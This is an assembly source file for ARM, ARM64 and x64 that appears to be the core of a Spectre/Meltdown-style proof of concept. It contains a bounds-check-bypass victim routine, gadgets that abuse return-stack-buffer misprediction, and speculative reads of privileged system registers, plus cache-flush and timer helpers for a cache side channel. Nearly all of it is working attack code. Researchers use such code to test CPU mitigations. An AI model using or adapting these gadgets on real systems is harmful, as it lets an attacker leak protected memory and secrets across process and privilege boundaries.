//Win CC
//Int        : rcx, rdx, r8, r9. Others passed on stack
//Fp         : xmm0 - xmm3. Others passed on stack
//Volatile   : rax,rcx,rdx,r8,r9, r10,r11, xmm0-xmm5 
//CallerSave : r10,r11,xmm4-xmm5
//
//AMD CC
//rdi - rsi - rdx - rcx - r8 - r9

//ARM64
//r0-7 input/res
//r8   indirect result location
//r9-r15 tmp
//r16-r18 IPx
//r19-r28 callee-saved
//r29-30 FP LR

 #include "config.h"

.macro ALIGN_FUNC
     .align 4
.endm
.macro ALIGN_LOOP
     .align 4
.endm
.macro ALIGN_CACHELINE
     .align 6
.endm

.macro DEFUN name
     ALIGN_FUNC
     .global    \name
\name:
.endm

.macro DEFUNT name
ALIGN_FUNC
    .global     \name
    .thumb_func \name
    .code       16
\name:
.endm


#ifdef __arm__

DEFUN _dummy_call
    bx lr

DEFUNT _calib_seq_add

1:  .rept   19
    sub     r0,r0,#1
    .endr
    subs    r0,r0,#1
    bne     1b
    bx      lr

DEFUN _sync_threads
    bx      lr

#elif __arm64__
    .arch       armv8-a

DEFUN _dummy_call
    ret

DEFUN _calib_seq_add
1:  .rept   19
    sub     x0,x0,#1
    .endr
    subs    x0,x0,#1
    bne     1b
    ret

DEFUN _cacheline_flush
    dc      civac,x0
    dmb     ish
    ret

//MRS x0, TTBR0_EL1
//  mrs     x0, SCTLR_EL1
//ORR X0, X0, #EE_bit
//MSR SCTLR_EL1, X0

DEFUN _read_raw_timebase
    mrs     x0, CNTFRQ_EL0
    ret

DEFUN _read_raw_timer
    isb
    mrs     x0, CNTPCT_EL0
    ret

//tring to put the heat on memory system (for robust detection)
.macro DETECTOR_LD dst, detector_ptr, byte
    lsl     \dst,\byte,#CACHE_STRIDE_SHIFT
    .ifne CACHE_LINE_OFFSET_SHIFT
    add     \dst,\dst,\byte, LSL #CACHE_LINE_OFFSET_SHIFT
    .endif
    .ifne CACHE_LINE_SPLIT
    add     \dst,\dst,#CACHE_LINE_SPLIT
    .endif
    ldr     \dst, [\detector_ptr, \dst]
.endm

#define DETECTOR_PTR(byte, type) ((type*)(&cache_detector[byte*(CACHE_STRIDE + CACHE_LINE_OFFSET) + CACHE_LINE_SPLIT]))

    .if 1
// victim_1
DEFUN _victim_1_asm  //(uint64_t ofs, VICTIM_ARRAY_SIZE, cache_detector, ptr_to array_size)
//    ldr     x1,=_victim_array
//    ldr     x2,=_cache_detector
//    ldr     x3,=_victim_array_size
//    ldr     x2,[x2]
    ldr     x3,[x3]
    cmp     x0,x3
    bhs     1f
    //speculative access
    ldrb    w0,[x1,x0]     //get byte
    DETECTOR_LD x3,x2,x0   //perform the load to trigger one of detector ways
1:  ret
    .endif

//x0 victim_array
//x1 cache_detector
DEFUN _stall_speculate
    dsb     ish
    mov     x7,lr
    bl      1f          //call 1f, but return back to caller
    ldrb    w2,[x0]     //but RSB (return stack buffer) returns here speculatively
    DETECTOR_LD x0,x1,x2
1:  mov     x3,#-1
    mov     x4,#333
    .rept   5           //1-5 is ok for A11
    udiv    x3,x3,x4    //cause stall with long instructions
    .endr               //to delay correct LR calculation 
    lsr     x3,x3,#48
    add     lr,x7,x3
    ret

//x0 shift, bits
//x1 cache detector
DEFUN _stall_speculate_valid_reg
    dsb     ish
    mov     x7,lr
    bl      1f
    mrs     x2, CNTFRQ_EL0
    lsr     x2,x2,x0
    and     x2,x2,#0xff
    DETECTOR_LD x0,x1,x2
1:  mov     x3,#-1
    mov     x4,#333
    .rept   5           //1-5 is ok for A11
    udiv    x3,x3,x4
    .endr
    lsr     x3,x3,#48
    add     lr,x7,x3
    ret

DEFUN _stall_speculate_invalid_reg
    dsb     ish
    mov     x7,lr
    bl      1f
    mrs     x2, MIDR_EL1
    lsr     x2,x2,x0
    and     x2,x2,#0xff
    DETECTOR_LD x0,x1,x2
1:  mov     x3,#-1
    mov     x4,#333
    .rept   5           //1-5 is ok for A11
    udiv    x3,x3,x4
    .endr
    lsr     x3,x3,#48
    add     lr,x7,x3
    ret

#else  //x64

.macro DETECTOR_LD dst, detector_ptr, byte
//    mov       \byte,\dst
    shlq    $CACHE_STRIDE_SHIFT,\dst
    .ifne CACHE_LINE_OFFSET_SHIFT
    shlq    $CACHE_LINE_OFFSET_SHIFT,\byte
    add     \byte,\dst
    .endif
    movq    CACHE_LINE_SPLIT(\detector_ptr, \dst), \dst
.endm


DEFUN _dummy_call
    retq

DEFUN _calib_seq_add

1:  .rept 20
    addl    %ecx,%ecx
    .endr
    sub     $20,%rdi
    jne     1b
    retq

//https://github.com/mniip/spectre-meltdown-poc/blob/master/poc.c

DEFUN _stall_speculate
    mfence
    call    1f
    movzbl  (%rdi), %eax
//  shll    $12, %eax
//  movq    (%rsi, %rax), %rcx
    DETECTOR_LD %rcx,%rsi,%rax
1:  xorps   %xmm0, %xmm0
    .rept   4  //long instructions to delay the moment of ret
    aesimc  %xmm0, %xmm0
    .endr
    movd    %xmm0, %eax
    lea     8(%rsp, %rax), %rsp  //dependency chain affects sp
    ret


DEFUN _stall_speculate_valid_reg
DEFUN _stall_speculate_invalid_reg
	ret

#endif

